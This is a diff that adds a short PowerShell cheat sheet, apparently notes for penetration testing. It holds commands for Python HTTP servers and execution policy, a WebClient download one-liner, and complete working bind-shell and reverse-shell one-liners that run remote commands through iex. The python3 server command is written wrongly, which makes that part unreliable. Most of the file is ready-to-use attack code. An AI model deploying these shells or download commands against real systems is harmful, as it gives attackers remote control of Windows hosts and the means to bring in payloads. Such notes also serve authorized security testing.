@@ -1,0 +1,35 @@
+PowerShell
+It is used to manage windows environment
+##########
+
+To make simple HTTP server:
+
+defualt port: 8000 
+
+python2: 
+python -m SimpleHTTPServer 8888
+
+python3:
+python3 -m server.http 8888
+---------------------------------------------------------------------------------
+
+to run scripts with no issues:
+
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+Get-ChildItem
+Get-Alias
+---------------------------------------------------------------------------------
+PowerShell File Transfers:
+
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip}:{port}/{file.txt}','{where to be saved}')"
+---------------------------------------------------------------------------------
+PowerShell Bind Shells:
+
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{port});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+---------------------------------------------------------------------------------
+PowerShell Reverse Shells:
+
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+---------------------------------------------------------------------------------
+
